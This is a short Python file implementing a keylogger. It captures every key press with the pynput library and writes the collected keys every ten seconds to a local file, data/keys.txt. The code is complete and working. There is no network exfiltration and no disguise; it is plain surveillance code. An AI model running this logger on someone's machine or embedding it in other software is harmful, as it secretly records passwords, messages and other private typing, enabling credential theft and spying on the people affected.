import pynput.keyboard
import threading

keys = []

def on_press(key):
    keys.append(str(key))

def report():
    with open("data/keys.txt", "a") as f:
        f.write("".join(keys))
    keys.clear()
    threading.Timer(10, report).start()

def run():
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    report()
